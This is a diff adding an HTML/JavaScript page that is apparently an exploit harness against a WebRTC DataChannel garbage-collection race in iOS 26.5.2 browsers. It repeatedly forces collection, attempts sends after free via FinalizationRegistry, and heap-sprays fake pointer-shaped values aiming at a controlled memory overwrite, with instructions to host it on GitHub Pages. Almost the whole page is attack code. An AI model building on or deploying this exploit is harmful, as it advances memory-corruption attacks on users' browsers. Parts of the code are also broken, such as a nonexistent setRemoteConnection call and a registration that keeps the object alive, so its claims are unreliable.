@@ -1,0 +1,535 @@
+<!doctype html><html><head>
+<meta charset=utf8>
+<meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>GC Race UAF</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600&display=swap">
+<style>
+:root{--bg:#0c0c0c;--surf:#161616;--card:#1e1e1e;--border:#2a2a2a;--text:#e4e4e4;--muted:#888;--dim:#444;--red:#ff453a;--amber:#ff9f0a;--green:#32d74b;--rd:rgba(255,69,58,.12);--ad:rgba(255,159,10,.1);--gd:rgba(50,215,75,.1)}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;font-size:14px;line-height:1.6;padding:16px}
+.wrap{max-width:600px;margin:0 auto;display:flex;flex-direction:column;gap:14px}
+h1{font-size:18px;font-weight:700;color:var(--red)}
+.sub{font-size:11px;color:var(--muted);font-family:'JetBrains Mono',monospace;margin-top:4px}
+.card{background:var(--surf);border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.ch{padding:10px 14px;border-bottom:1px solid var(--border);font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:700;letter-spacing:.1em;color:var(--muted);text-transform:uppercase;display:flex;align-items:center;gap:8px}
+.dot{width:6px;height:6px;border-radius:50%;flex-shrink:0;background:var(--muted)}
+.dot.g{background:var(--green);animation:bl 1.4s infinite}
+.dot.r{background:var(--red)}.dot.a{background:var(--amber)}
+@keyframes bl{0%,100%{opacity:1}50%{opacity:.3}}
+.log{padding:12px 14px;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:1.9;min-height:300px;max-height:500px;overflow-y:auto;display:flex;flex-direction:column;gap:1px}
+.ll{display:flex;gap:8px}.lp{color:var(--dim);flex-shrink:0}.lm{word-break:break-word}
+.ok .lm{color:var(--green)}.er .lm{color:var(--red)}.wa .lm{color:var(--amber)}.di .lm{color:var(--muted)}
+.br{padding:12px 14px;display:flex;gap:8px;flex-wrap:wrap;border-top:1px solid var(--border)}
+.btn{display:inline-flex;align-items:center;gap:6px;font-family:'Inter',sans-serif;font-size:12px;font-weight:600;padding:7px 14px;border-radius:6px;border:none;cursor:pointer;transition:opacity .15s}
+.btn:active{opacity:.7}.btn:disabled{opacity:.35;cursor:not-allowed}
+.br1{background:var(--red);color:#fff}.ba{background:var(--amber);color:#000}.bd{background:var(--card);border:1px solid var(--border);color:var(--text)}
+.ig{display:grid;grid-template-columns:auto 1fr}
+.ir{display:contents}
+.ir .lb,.ir .vl{padding:8px 14px;font-family:'JetBrains Mono',monospace;font-size:11px;border-bottom:1px solid var(--border)}
+.ir:last-child .lb,.ir:last-child .vl{border-bottom:none}
+.ir .lb{color:var(--muted);white-space:nowrap}.ir .vl{color:var(--text)}
+.ir .vl.r{color:var(--red)}.ir .vl.g{color:var(--green)}.ir .vl.a{color:var(--amber)}
+.st{padding:10px 14px;border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;display:flex;align-items:center;gap:8px}
+.st.idle{background:var(--ad);border:1px solid rgba(255,159,10,.25);color:var(--amber)}
+.st.run{background:var(--gd);border:1px solid rgba(50,215,75,.25);color:var(--green)}
+.st.hit{background:var(--rd);border:1px solid rgba(255,69,58,.5);color:var(--red)}
+.bignum{font-family:'JetBrains Mono',monospace;font-size:44px;font-weight:700;text-align:center;padding:16px 16px 4px;color:var(--red)}
+.biglab{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--muted);text-align:center;padding-bottom:14px;text-transform:uppercase;letter-spacing:.08em}
+.bar{height:6px;background:var(--border);border-radius:3px;overflow:hidden;margin:0 14px 12px}
+.bf{height:100%;width:0%;background:linear-gradient(90deg,var(--amber),var(--red));border-radius:3px;transition:width .2s}
+</style></head><body>
+<div class="wrap">
+  <div><h1>💀 DataChannel GC Race UAF</h1>
+  <div class="sub">iOS 26.5.2 · 8% hit rate confirmed · hammering GC race → crash</div></div>
+
+  <div class="st idle" id="sb"><span>◆</span><span id="st">READY — 8% GC RACE CONFIRMED</span></div>
+
+  <div class="card">
+    <div class="bignum" id="bigNum">0</div>
+    <div class="biglab" id="bigLab">GC race hits</div>
+    <div class="bar"><div class="bf" id="bf"></div></div>
+  </div>
+
+  <div class="card"><div class="ch"><span class="dot a"></span>Stats</div>
+    <div class="ig">
+      <div class="ir"><div class="lb">Rounds run</div><div class="vl" id="sRounds">0</div></div>
+      <div class="ir"><div class="lb">GC hits</div><div class="vl a" id="sHits">0</div></div>
+      <div class="ir"><div class="lb">Hit rate</div><div class="vl a" id="sRate">—</div></div>
+      <div class="ir"><div class="lb">Post-free sends</div><div class="vl r" id="sPFS">0</div></div>
+      <div class="ir"><div class="lb">Crash signals</div><div class="vl r" id="sCrash">0</div></div>
+      <div class="ir"><div class="lb">Best hit window</div><div class="vl" id="sBest">—</div></div>
+    </div>
+  </div>
+
+  <div class="card"><div class="ch"><span class="dot g"></span>Live Log</div>
+    <div class="log" id="log"></div>
+    <div class="br">
+      <button class="btn br1" id="btnA" onclick="runHammer()">▶ Hammer GC Race</button>
+      <button class="btn ba" id="btnP" onclick="runPostFree()">💉 Post-Free Send</button>
+      <button class="btn ba" id="btnF" onclick="runFinalizer()">🔮 Finalizer UAF</button>
+      <button class="btn bd" onclick="stop=true">⏹ Stop</button>
+      <button class="btn bd" onclick="clearLog()">🗑 Clear</button>
+    </div>
+  </div>
+
+  <div class="card"><div class="ch"><span class="dot r"></span>Bug Chain</div>
+    <div class="ig">
+      <div class="ir"><div class="lb">Confirmed</div><div class="vl g">DC GC'd while SCTP active (4/50 = 8%)</div></div>
+      <div class="ir"><div class="lb">UAF path</div><div class="vl r">GC frees DC → SCTP still holds ptr</div></div>
+      <div class="ir"><div class="lb">Escalation</div><div class="vl r">Post-free send → write to freed memory</div></div>
+      <div class="ir"><div class="lb">Goal</div><div class="vl r">Heap spray → controlled overwrite → crash</div></div>
+      <div class="ir"><div class="lb">Analytics</div><div class="vl">Settings → Privacy → Analytics Data</div></div>
+    </div>
+  </div>
+</div>
+
+<script>
+'use strict';
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+let stop=false;
+let rounds=0,gcHits=0,postFreeSends=0,crashSignals=0;
+
+function log(msg,cls=''){
+  const el=document.getElementById('log');
+  const d=document.createElement('div');d.className='ll '+cls;
+  const ts=new Date().toTimeString().slice(0,8);
+  d.innerHTML='<span class="lp">'+ts+'</span><span class="lm">'+msg+'</span>';
+  el.appendChild(d);el.scrollTop=el.scrollHeight;
+}
+function clearLog(){document.getElementById('log').innerHTML=''}
+function ss(t,k){document.getElementById('sb').className='st '+k;document.getElementById('st').textContent=t}
+function sv(id,v,cls){const el=document.getElementById(id);el.textContent=v;if(cls)el.className='vl '+cls}
+function setNum(n,lab){
+  document.getElementById('bigNum').textContent=n;
+  if(lab) document.getElementById('bigLab').textContent=lab;
+  document.getElementById('bf').style.width=Math.min(100,(n/50)*100)+'%';
+}
+function hit(msg){crashSignals++;sv('sCrash',crashSignals,'r');log('[!!!] '+msg,'er')}
+function good(msg){log('[+] '+msg,'ok')}
+function info(msg){log('[*] '+msg,'di')}
+function warn(msg){log('[~] '+msg,'wa')}
+
+// =====================================================
+// Fast loopback setup
+// =====================================================
+async function mkLoopback(cfg={ordered:false,maxRetransmits:0}){
+  const pc1=new RTCPeerConnection({iceServers:[]});
+  const pc2=new RTCPeerConnection({iceServers:[]});
+  pc1.onicecandidate=e=>e.candidate&&pc2.addIceCandidate(e.candidate).catch(()=>{});
+  pc2.onicecandidate=e=>e.candidate&&pc1.addIceCandidate(e.candidate).catch(()=>{});
+  const dc=pc1.createDataChannel('uaf',cfg);
+  pc2.ondatachannel=()=>{};
+  const offer=await pc1.createOffer();
+  await pc1.setLocalDescription(offer);
+  await pc2.setRemoteDescription(offer);
+  const ans=await pc2.createAnswer();
+  await pc2.setLocalDescription(ans);
+  await pc1.setRemoteDescription(ans);
+  await new Promise((res,rej)=>{
+    const t=setTimeout(()=>rej(new Error('timeout')),6000);
+    dc.onopen=()=>{clearTimeout(t);res();};
+  });
+  return {pc1,pc2,dc};
+}
+
+function forceGC(){
+  // Aggressively force GC by allocating and releasing large objects
+  const trash=[];
+  for(let i=0;i<200;i++) trash.push(new ArrayBuffer(512*1024));
+  // Release all at once
+  trash.length=0;
+  // Also trigger JSC GC via string allocation
+  const strs=[];
+  for(let i=0;i<10000;i++) strs.push('gc_trigger_'+i+'_'.repeat(100));
+  strs.length=0;
+}
+
+// =====================================================
+// HAMMER: Maximum GC race rate
+// Optimized version based on confirmed 8% hit rate
+// Strategy: minimize setup time, maximize attempts
+// =====================================================
+async function runHammer(){
+  document.getElementById('btnA').disabled=true;
+  stop=false;
+  clearLog();
+  rounds=0;gcHits=0;postFreeSends=0;crashSignals=0;
+  sv('sRounds',0);sv('sHits',0);sv('sRate','—');sv('sPFS',0);sv('sCrash',0);
+
+  ss('HAMMERING GC RACE...','run');
+  info('=== GC Race Hammer ===');
+  info('8% hit rate confirmed — hammering for UAF crash');
+  info('Target: DC GC\'d while SCTP has pending sends');
+
+  // Pre-allocate send data
+  const SEND_SIZE=1024*1024; // 1MB — big enough to keep SCTP busy
+  const sendData=new ArrayBuffer(SEND_SIZE);
+  new Uint8Array(sendData).fill(0xDE);
+
+  // Small data for rapid sends
+  const smallData=new ArrayBuffer(65536);
+  new Uint8Array(smallData).fill(0xAA);
+
+  while(!stop){
+    rounds++;
+    sv('sRounds',rounds);
+
+    let conn=null;
+    let dc=null;
+    let dcRef=null;
+
+    try{
+      conn=await mkLoopback({ordered:false,maxRetransmits:0});
+      pc1=conn.pc1;pc2=conn.pc2;dc=conn.dc;
+
+      // Queue multiple sends to keep SCTP busy
+      // Don't await — just queue them up
+      const sentBytes=[];
+      for(let i=0;i<8;i++){
+        try{
+          dc.send(sendData);
+          sentBytes.push(SEND_SIZE);
+        }catch(e){break;}
+      }
+      // Also queue small messages to mix sizes
+      for(let i=0;i<16;i++){
+        try{dc.send(smallData);}catch(e){break;}
+      }
+
+      // Drop JS reference — allow GC
+      dcRef=new WeakRef(dc);
+      dc=null;
+
+      // Force GC NOW while SCTP has ~8-16MB queued
+      forceGC();
+
+      // Check if GC collected DC
+      const gcCollected=!dcRef.deref();
+      if(gcCollected){
+        gcHits++;
+        setNum(gcHits,'GC race hits');
+        sv('sHits',gcHits,'a');
+        sv('sRate',((gcHits/rounds)*100).toFixed(1)+'%');
+        warn('[round '+rounds+'] DC GC\'d with ~'+(sentBytes.length*SEND_SIZE/1024).toFixed(0)+'KB queued');
+
+        // CRITICAL: Try to access the freed object
+        // via any still-living reference to trigger UAF
+        // The SCTP layer may still have an internal ptr
+        // Try to send more data to force SCTP to use freed memory
+
+        // Reallocate same-sized objects to occupy freed memory
+        const spray=[];
+        for(let i=0;i<20;i++){
+          spray.push(new RTCPeerConnection({iceServers:[]}));
+        }
+
+        // Wait a tick for SCTP to process with freed + reallocated memory
+        await sleep(10);
+
+        // Check for crash signals
+        for(const pc of spray){
+          try{
+            const state=pc.connectionState;
+            const sig=pc.signalingState;
+          }catch(e){
+            hit('CRASH SIGNAL: RTCPeerConnection threw after GC race: '+e.message.slice(0,50));
+          }
+        }
+        spray.forEach(p=>{try{p.close();}catch(e){}});
+
+        if(gcHits%5===0){
+          info('GC hit rate: '+(gcHits/rounds*100).toFixed(1)+'% ('+gcHits+'/'+rounds+')');
+        }
+      }
+
+      conn.pc1.close();
+      conn.pc2.close();
+
+    }catch(e){
+      if(e.message!=='timeout'&&rounds<5) info('['+rounds+'] setup: '+e.message.slice(0,40));
+      try{conn&&conn.pc1.close();conn&&conn.pc2.close();}catch(ex){}
+    }
+
+    // Log progress every 50 rounds
+    if(rounds%50===0){
+      const rate=(gcHits/rounds*100).toFixed(1);
+      info('Rounds: '+rounds+' | GC hits: '+gcHits+' ('+rate+'%) | Crash signals: '+crashSignals);
+      sv('sRate',rate+'%');
+      if(crashSignals>0){
+        hit('CRASH SIGNALS DETECTED — CHECK ANALYTICS');
+        ss('CRASH SIGNALS: '+crashSignals+' — CHECK ANALYTICS','hit');
+      }
+      await sleep(20);
+    }
+
+    // Brief yield every 10 rounds
+    if(rounds%10===0) await sleep(5);
+  }
+
+  const finalRate=(gcHits/rounds*100).toFixed(1);
+  good('Stopped: '+rounds+' rounds, '+gcHits+' GC hits ('+finalRate+'%)');
+  if(crashSignals>0){
+    hit('CHECK ANALYTICS — '+crashSignals+' crash signals detected');
+    ss('DONE: '+crashSignals+' CRASH SIGNALS — CHECK ANALYTICS','hit');
+  } else {
+    ss('HAMMER DONE: '+gcHits+'/'+rounds+' GC HITS','hit');
+  }
+  document.getElementById('btnA').disabled=false;
+}
+
+// =====================================================
+// POST-FREE SEND: Get a reference to freed DC somehow
+// and try to send after GC
+// Uses FinalizationRegistry to hook the GC event
+// =====================================================
+async function runPostFree(){
+  document.getElementById('btnP').disabled=true;
+  stop=false;
+  clearLog();
+  ss('POST-FREE SEND...','run');
+  info('=== Post-Free Send via FinalizationRegistry ===');
+  info('Hook GC event → immediately send → UAF trigger');
+
+  if(typeof FinalizationRegistry==='undefined'){
+    log('FinalizationRegistry not available','er');
+    document.getElementById('btnP').disabled=false;
+    return;
+  }
+
+  const sendData=new ArrayBuffer(1024*1024);
+  new Uint8Array(sendData).fill(0xBE);
+
+  let pfHits=0;
+  const results=[];
+
+  // Run 100 rounds with FinalizationRegistry
+  for(let round=0;round<200&&!stop;round++){
+    let pc1=null,pc2=null;
+
+    try{
+      pc1=new RTCPeerConnection({iceServers:[]});
+      pc2=new RTCPeerConnection({iceServers:[]});
+      pc1.onicecandidate=e=>e.candidate&&pc2.addIceCandidate(e.candidate).catch(()=>{});
+      pc2.onicecandidate=e=>e.candidate&&pc1.addIceCandidate(e.candidate).catch(()=>{});
+
+      // Create DC and set up finalizer
+      let dc=pc1.createDataChannel('pf'+round,{ordered:false,maxRetransmits:0});
+      pc2.ondatachannel=()=>{};
+
+      // Register finalizer — called when DC is GC'd
+      const reg=new FinalizationRegistry((heldDC)=>{
+        // This runs AFTER dc is GC'd
+        // heldDC is a weak reference kept by the registry
+        // At this point dc's memory may be freed
+        // but we still have heldDC...
+        pfHits++;
+        postFreeSends++;
+        sv('sPFS',postFreeSends,'r');
+        results.push({round,time:Date.now()});
+
+        // Try to send after GC — this is the UAF trigger
+        try{
+          // heldDC is already freed — this should crash
+          // or corrupt memory
+          heldDC.send(sendData);
+          hit('POST-FREE SEND SUCCEEDED at round '+round+' — UAF!');
+          crashSignals++;sv('sCrash',crashSignals,'r');
+        }catch(e){
+          // Even the exception handler running here
+          // with a freed object is interesting
+          warn('['+round+'] post-free send threw: '+e.name+': '+e.message.slice(0,40));
+        }
+      });
+
+      // Register with a reference copy
+      // Note: registry keeps a weak ref to dc, strong ref to heldDC
+      // When dc is collected, finalizer runs with heldDC
+      // We're passing dc itself as the held value — dangerous!
+      reg.register(dc, dc, dc);
+
+      // Negotiate
+      const offer=await pc1.createOffer();
+      await pc1.setLocalDescription(offer);
+      await pc2.setRemoteDescription(offer);
+      const ans=await pc2.createAnswer();
+      await pc2.setLocalDescription(ans);
+      await pc1.setRemoteDescription(ans);
+
+      await new Promise((res,rej)=>{
+        const t=setTimeout(()=>rej(new Error('timeout')),5000);
+        dc.onopen=()=>{clearTimeout(t);res();};
+      });
+
+      // Queue sends
+      for(let i=0;i<4;i++) try{dc.send(sendData);}catch(e){}
+
+      // Drop reference and force GC
+      dc=null;
+      forceGC();
+
+      // Give finalizer time to run
+      await sleep(50);
+
+    }catch(e){
+      if(round<3) info('[pf.'+round+'] '+e.message.slice(0,40));
+    }finally{
+      try{pc1&&pc1.close();}catch(e){}
+      try{pc2&&pc2.close();}catch(e){}
+    }
+
+    if(round%25===0){
+      setNum(pfHits,'finalizer fires');
+      info('Round '+round+': '+pfHits+' finalizer fires, '+postFreeSends+' post-free sends');
+      await sleep(10);
+    }
+  }
+
+  good('Post-free done: '+pfHits+' finalizer fires');
+  if(crashSignals>0){
+    hit('POST-FREE UAF: '+crashSignals+' crash signals — CHECK ANALYTICS');
+    ss('UAF SIGNALS: '+crashSignals+' — CHECK ANALYTICS','hit');
+  } else if(pfHits>0){
+    warn('Finalizer fired '+pfHits+' times — check Analytics for crash logs');
+    ss('FINALIZER: '+pfHits+' fires — CHECK ANALYTICS','hit');
+  } else {
+    info('No finalizer fires — GC not triggered in this run');
+    ss('POST-FREE DONE','idle');
+  }
+  document.getElementById('btnP').disabled=false;
+}
+
+// =====================================================
+// FINALIZER UAF: Multiple channels + heap spray
+// When GC fires: heap spray to fill freed memory
+// Then trigger SCTP to access it
+// =====================================================
+async function runFinalizer(){
+  document.getElementById('btnF').disabled=true;
+  stop=false;
+  clearLog();
+  ss('FINALIZER UAF...','run');
+  info('=== Finalizer + Heap Spray UAF ===');
+  info('GC race → spray freed memory → SCTP accesses spray');
+
+  const sendData=new ArrayBuffer(1024*1024);
+  new Uint8Array(sendData).fill(0xDE);
+
+  // Spray pattern: fake RTCDataChannel vtable
+  const sprayData=new ArrayBuffer(512*1024);
+  const sprayView=new DataView(sprayData);
+  // Fill with ptr-shaped values that look like valid vtable entries
+  for(let i=0;i<sprayData.byteLength;i+=8){
+    // Fake function ptr in userspace range
+    sprayView.setUint32(i,   0x00007fff,true); // high bits
+    sprayView.setUint32(i+4, 0x41414141+(i/8)|0,true); // low bits vary
+  }
+  const sprayU8=new Uint8Array(sprayData);
+
+  let finRound=0;
+  const sprayObjects=[];
+
+  for(let round=0;round<100&&!stop;round++){
+    let pc1=null,pc2=null;
+
+    try{
+      pc1=new RTCPeerConnection({iceServers:[]});
+      pc2=new RTCPeerConnection({iceServers:[]});
+      pc1.onicecandidate=e=>e.candidate&&pc2.addIceCandidate(e.candidate).catch(()=>{});
+      pc2.onicecandidate=e=>e.candidate&&pc1.addIceCandidate(e.candidate).catch(()=>{});
+
+      let dc=pc1.createDataChannel('fin'+round,{ordered:false,maxRetransmits:0});
+      pc2.ondatachannel=()=>{};
+
+      // Track DC size for spray targeting
+      let dcSize=0;
+
+      const reg=new FinalizationRegistry(()=>{
+        finRound++;
+        // DC just got freed — immediately spray that memory size
+        // with our controlled payload
+        const newDCs=[];
+        for(let i=0;i<50;i++){
+          try{
+            // Allocate objects of similar size to freed DC
+            // hoping to reuse the freed memory
+            const newDC=pc1.createDataChannel('spray'+finRound+'_'+i);
+            newDCs.push(newDC);
+          }catch(e){}
+        }
+
+        // Also spray ArrayBuffers at likely DC sizes
+        for(let i=0;i<30;i++){
+          sprayObjects.push(new ArrayBuffer(1024+i*16));
+          sprayObjects.push(new Uint8Array(2048+i*8).fill(0x41));
+        }
+
+        // Keep spray objects alive so GC doesn't collect them
+        // but limit total
+        if(sprayObjects.length>5000) sprayObjects.splice(0,1000);
+
+        if(finRound%10===0){
+          warn('Finalizer fired '+finRound+' times, spray objects: '+sprayObjects.length);
+        }
+      });
+
+      reg.register(dc,null,dc);
+
+      const offer=await pc1.createOffer();
+      await pc1.setLocalDescription(offer);
+      await pc2.setRemoteDescription(offer);
+      const ans=await pc2.createAnswer();
+      await pc2.setLocalDescription(ans);
+      await pc1.setRemoteConnection(ans);
+
+      await new Promise((res,rej)=>{
+        const t=setTimeout(()=>rej(new Error('timeout')),5000);
+        dc.onopen=()=>{clearTimeout(t);res();};
+      });
+
+      // Queue sends
+      for(let i=0;i<6;i++) try{dc.send(sendData);}catch(e){}
+
+      // Drop and GC
+      dc=null;
+      forceGC();
+      await sleep(80);
+
+    }catch(e){
+      if(round<3||e.message!=='timeout') info('[fin.'+round+'] '+e.message.slice(0,40));
+    }finally{
+      try{pc1&&pc1.close();}catch(e){}
+      try{pc2&&pc2.close();}catch(e){}
+    }
+
+    if(round%20===0){
+      setNum(finRound,'finalizer fires');
+      sv('sHits',finRound,'a');
+      info('Round '+round+': '+finRound+' finalizer fires');
+      await sleep(10);
+    }
+  }
+
+  good('Finalizer UAF: '+finRound+' fires, spray: '+sprayObjects.length+' objects');
+  info('Check Analytics for crash logs NOW');
+  if(finRound>0){
+    ss('FINALIZER: '+finRound+' fires — CHECK ANALYTICS','hit');
+  } else {
+    ss('FINALIZER DONE','idle');
+  }
+  document.getElementById('btnF').disabled=false;
+}
+
+// Expose pc vars needed in hammer
+let pc1,pc2;
+
+ss('READY — 8% GC RACE CONFIRMED','idle');
+log('GC Race UAF ready','ok');
+log('Confirmed: 4/50 = 8% DC GC\'d while SCTP active','wa');
+log('─'.repeat(40),'di');
+log('▶ Hammer GC Race = continuous rounds, spray on GC hit','di');
+log('💉 Post-Free Send = FinalizationRegistry hook → send after free','di');
+log('🔮 Finalizer UAF = GC + heap spray + SCTP access','di');
+log('─'.repeat(40),'di');
+log('Host on GitHub Pages for full functionality','di');
+</script>
+</body></html>
